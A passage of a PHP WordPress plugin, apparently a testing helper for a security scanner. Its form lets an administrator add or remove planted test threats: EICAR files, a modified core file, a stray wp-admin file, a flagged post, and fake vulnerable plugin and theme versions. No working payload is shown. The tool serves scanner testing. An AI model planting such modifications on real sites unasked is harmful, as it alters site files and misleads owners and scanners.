		} elseif ( $infected_file ) {
			$successes[] = $infected_file;
		}

		// Fake vulnerable plugin
		if ( isset( $_POST['fake-vulnerable-plugin'] ) ) {
			$fake_vulnerable_plugin = ! $this->fake_vulnerable_plugin_exists() ? $this->generate_fake_vulnerable_plugin() : null;
		} else {
			$fake_vulnerable_plugin = $this->fake_vulnerable_plugin_exists() ? $this->remove_fake_vulnerable_plugin() : null;
		}
		if ( is_wp_error( $fake_vulnerable_plugin ) ) {
			$errors[] = $fake_vulnerable_plugin;
		} elseif ( $fake_vulnerable_plugin ) {
			$successes[] = $fake_vulnerable_plugin;
		}

		// Fake vulnerable theme
		if ( isset( $_POST['fake-vulnerable-theme'] ) ) {
			$fake_vulnerable_theme = ! $this->fake_vulnerable_theme_exists() ? $this->generate_fake_vulnerable_theme() : null;
		} else {
			$fake_vulnerable_theme = $this->fake_vulnerable_theme_exists() ? $this->remove_fake_vulnerable_theme() : null;
		}
		if ( is_wp_error( $fake_vulnerable_theme ) ) {
			$errors[] = $fake_vulnerable_theme;
		} elseif ( $fake_vulnerable_theme ) {
			$successes[] = $fake_vulnerable_theme;
		}

		// Fuzzy Hash
		if ( isset( $_POST['fuzzy-hash'] ) ) {
			$fuzzy_hash = ! $this->fuzzy_hash_threat_exists() ? $this->generate_fuzzy_hash_threat() : null;
		} else {
			$fuzzy_hash = $this->fuzzy_hash_threat_exists() ? $this->remove_fuzzy_hash_threat() : null;
		}
		if ( is_wp_error( $fuzzy_hash ) ) {
			$errors[] = $fuzzy_hash;
		} elseif ( $fuzzy_hash ) {
			$successes[] = $fuzzy_hash;
		}

		return array(
			'errors'    => $errors,
			'successes' => $successes,
		);
	}

	/**
	 * Render the UI.
	 */
	public function render_ui() {
		$submission = $this->handle_submit();

		// eicar check
		$eicar = $this->wp_file_exists( $this->threats['eicar'] ) ? 'checked="checked"' : '';

		// suspicious link check
		$suspicious_link = $this->wp_file_exists( $this->threats['suspicious_link'] ) ? 'checked="checked"' : '';

		// core modification check
		$dir      = str_replace( site_url() . '/', ABSPATH, admin_url() );
		$lines    = $this->get_contents_array( "$dir/index.php" );
		$core_mod = $lines[ count( $lines ) - 1 ] === 'if ( true === false ) exit();' ? 'checked' : '';

		// non-core file check
		$dir      = str_replace( site_url() . '/', ABSPATH, admin_url() );
		$core_add = $this->wp_file_exists( "$dir/non-core-file.php" ) ? 'checked' : '';

		// post db check
		$post_db = post_exists( 'Scan Tester Post' ) ? 'checked' : '';

		// infected file check
		$dir    = str_replace( site_url() . '/', ABSPATH, content_url() );
		$lines  = file( "$dir/index.php" );
		$infect = $lines[ count( $lines ) - 1 ] === 'HTML;' ? 'checked' : '';

		// fake vulnerable plugin check
		$fake_vulnerable_plugin = $this->wp_file_exists( $this->threats['fake_vulnerable_plugin'] ) ? 'checked="checked"' : '';

		// fake vulnerable theme check
		$fake_vulnerable_theme = $this->wp_file_exists( $this->threats['fake_vulnerable_theme'] ) ? 'checked="checked"' : '';

		// fuzzy hash check
		$fuzzy_hash = $this->wp_file_exists( $this->threats['fuzzy_hash_file'] ) ? 'checked="checked"' : '';

		?>

		<h1>Site Threats</h1>

		<div id="a8cjptt-alert" class="a8cjptt-alert">
			<?php
			if ( $submission ) {
				foreach ( $submission['errors'] as $wp_error ) {
					echo '<div class="a8cjptt-alert a8cjptt-danger">' . esc_attr( $wp_error->get_error_message() ) . '</div>';
				}
				foreach ( $submission['successes'] as $success ) {
					echo '<div class="a8cjptt-alert a8cjptt-success">' . esc_attr( $success ) . '</div>';
				}
				if ( empty( $submission['errors'] ) && empty( $submission['successes'] ) ) {
					echo '<div class="a8cjptt-alert a8cjptt-info">No modifications were made.</div>';
				}
			}
			?>
		</div>

		<form method="post" class="a8cjptt-threats">

			<?php wp_nonce_field( 'scan-helper-nonce' ); ?>

			<div>
				<label for="threat-eicar">
					<input type="checkbox" name="threat-eicar" id="threat-eicar" <?php echo esc_attr( $eicar ); ?>>
					<strong>EICAR Threat</strong>
					<br>
					Add/Remove five EICAR threats (one for every severity) to a new file in the WordPress <code>uploads</code> folder.
				</label>
			</div>

			<div>
				<label for="threat-suspicious-link">
					<input type="checkbox" name="threat-suspicious-link" id="threat-suspicious-link" <?php echo esc_attr( $suspicious_link ); ?>>
					<strong>Suspicious Link</strong>
					<br>
					Add/Remove a link that will be flagged by Akismet to a new file in the WordPress <code>uploads</code> folder.
				</label>
			</div>

			<div>
				<label for="threat-core">
					<input type="checkbox" name="threat-core" id="threat-core" <?php echo esc_attr( $core_mod ); ?>>
					<strong>Core File Modification Threat</strong>
					<br>
					Add/Remove a Core File Modification threat in the WordPress <code>wp-admin</code> folder.
				</label>
			</div>

			<div>
				<label for="threat-core-add">
					<input type="checkbox" name="threat-core-add" id="threat-core-add" <?php echo esc_attr( $core_add ); ?>>
					<strong>Add a Non-Core File to Core Directory</strong>
					<br>
					Add/Remove a file to the <code>wp-admin</code> core directory.
				</label>
			</div>

			<div>
				<label for="threat-post">
					<input type="checkbox" name="threat-post" id="threat-post" <?php echo esc_attr( $post_db ); ?>>
					<strong>Post DB Threat</strong>
					<br>
					Add/Remove a blog post containing data that will trigger a DB scan.
				</label>
			</div>

			<div>
				<label for="threat-infect">
					<input type="checkbox" name="threat-infect" id="threat-infect" <?php echo esc_attr( $infect ); ?>>
					<strong>Infect a File Threat</strong>
					<br>
					Add/Remove an EICAR threat to an existing file in the WordPress <code>contents</code> folder.
				</label>
			</div>

			<div>
				<label for="fake-vulnerable-plugin">
					<input type="checkbox" name="fake-vulnerable-plugin" id="fake-vulnerable-plugin" <?php echo esc_attr( $fake_vulnerable_plugin ); ?>>
					<strong>Create a fake vulnerable plugin</strong>
					<br>
					Add/Remove an fake vulnerable plugin - <code>WP Super Cache 1.7.2</code> see <a href="https://wpscan.com/plugin/wp-super-cache/">WPScan reference</a>.
				</label>
			</div>

			<div>
				<label for="fake-vulnerable-theme">
					<input type="checkbox" name="fake-vulnerable-theme" id="fake-vulnerable-theme" <?php echo esc_attr( $fake_vulnerable_theme ); ?>>
					<strong>Create a fake vulnerable theme</strong>
					<br>
					Add/Remove an fake vulnerable theme - <code>Twenty Fifteen 1.1</code> see <a href="https://wpscan.com/theme/twentyfifteen/">WPScan reference</a>.
				</label>
			</div>

			<div>
				<label for="fuzzy-hash">
					<input type="checkbox" name="fuzzy-hash" id="fuzzy-hash" <?php echo esc_attr( $fuzzy_hash ); ?>>
					<strong>Create a fuzzy hash threat</strong>
					<br>
					Add/Remove a fuzzy hash threat to a new file in the WordPress <code>contents</code> folder.
				</label>
			</div>

			<div>
				<input type="submit" name="save-scan-helper" value="Update Site Threats" class="button button-primary">
			</div>

		</form>
		<?php
	}
}

add_action(
	'plugins_loaded',
	function () {
		new Scan_Helper();
	},
	1000
);
